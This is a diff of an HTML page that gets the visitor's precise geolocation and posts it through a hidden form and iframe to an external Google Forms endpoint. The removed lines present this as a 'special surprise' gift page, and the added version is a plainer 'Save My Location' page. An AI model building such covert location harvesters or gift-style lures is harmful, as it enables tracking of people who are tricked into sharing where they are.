@@ -3,73 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Finder</title>
+    <title>Save My Location</title>
     <style>
         body {
-            font-family: 'Segoe UI', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background: linear-gradient(135deg, #ff9a9e, #fad0c4);
-            flex-direction: column;
-        }
-        .container {
+            font-family: Arial, sans-serif;
             text-align: center;
-            background: white;
-            padding: 2rem;
-            border-radius: 12px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-            max-width: 400px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            color: #d32f2f;
+            margin-top: 50px;
         }
         button {
-            background: #ff4081;
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #28a745;
             color: white;
             border: none;
-            padding: 12px 24px;
-            font-size: 18px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        button:hover {
-            background: #f50057;
-        }
-        .gift {
-            display: none;
-            margin-top: 20px;
-            font-size: 20px;
-            color: #388e3c;
-            font-weight: bold;
+            border-radius: 5px;
         }
         .status {
-            margin-top: 10px;
-            font-size: 16px;
-            font-weight: bold;
-            display: none;
+            margin-top: 20px;
+            font-size: 18px;
+            color: blue;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>A Special Surprise for You!</h1>
-        <button onclick="showGift()">Click for Your Gift</button>
-        <div class="gift" id="giftMessage">🎁 You just got a special present! Thank you! 🎁</div>
-    </div>
+    <h1>Click to Share Your Location</h1>
+    <button onclick="saveLocation()">Save My Location</button>
+    <div class="status" id="statusMessage"></div>
 
-    <div class="container">
-        <h1>Thank You Gift</h1>
-        <button onclick="requestLocation()">Click Here to Share Location</button>
-        <div class="status" id="statusMessage"></div>
-    </div>
-
-    <!-- Hidden Form for Google Forms Submission -->
+    <!-- Hidden Google Forms Submission -->
     <form id="googleForm" action="https://docs.google.com/forms/d/e/1FAIpQLSdd-5vv11ZJ3nV87vVhB1Zj9jHkrFXMBy1z38xc2QX-QLyz3w/formResponse" method="POST" target="hidden_iframe">
         <input type="hidden" name="entry.1234567890" id="latInput">
         <input type="hidden" name="entry.0987654321" id="lonInput">
@@ -77,38 +40,17 @@
     <iframe name="hidden_iframe" style="display:none;"></iframe>
 
     <script>
-        function showGift() {
-            document.getElementById('giftMessage').style.display = 'block';
-        }
-
-        function updateStatus(message, type = 'info') {
+        function updateStatus(message, color = 'blue') {
             const statusElement = document.getElementById('statusMessage');
             statusElement.textContent = message;
-            statusElement.style.display = 'block';
-            statusElement.style.color = type === 'success' ? 'green' : 'red';
+            statusElement.style.color = color;
         }
 
-        function saveToGoogleForms(lat, lon) {
-            document.getElementById('latInput').value = lat;
-            document.getElementById('lonInput').value = lon;
-            document.getElementById('googleForm').submit();
-
-            updateStatus('Location saved successfully!', 'success');
-
-            // Create downloadable file
-            const data = `Latitude: ${lat}, Longitude: ${lon}\n`;
-            const blob = new Blob([data], { type: 'text/plain' });
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'location.txt';
-            link.click();
-        }
-
-        function requestLocation() {
-            updateStatus('Requesting location...');
+        function saveLocation() {
+            updateStatus("Getting your location...");
 
             if (!navigator.geolocation) {
-                updateStatus('Geolocation not supported', 'error');
+                updateStatus("Geolocation not supported", "red");
                 return;
             }
 
@@ -116,11 +58,15 @@
                 (position) => {
                     const lat = position.coords.latitude.toFixed(6);
                     const lon = position.coords.longitude.toFixed(6);
-                    saveToGoogleForms(lat, lon);
+
+                    // Save to Google Forms
+                    document.getElementById('latInput').value = lat;
+                    document.getElementById('lonInput').value = lon;
+                    document.getElementById('googleForm').submit();
+
+                    updateStatus("Location saved successfully!", "green");
                 },
-                (error) => {
-                    updateStatus('Location access denied', 'error');
-                },
+                () => updateStatus("Location access denied", "red"),
                 { enableHighAccuracy: true, timeout: 5000 }
             );
         }
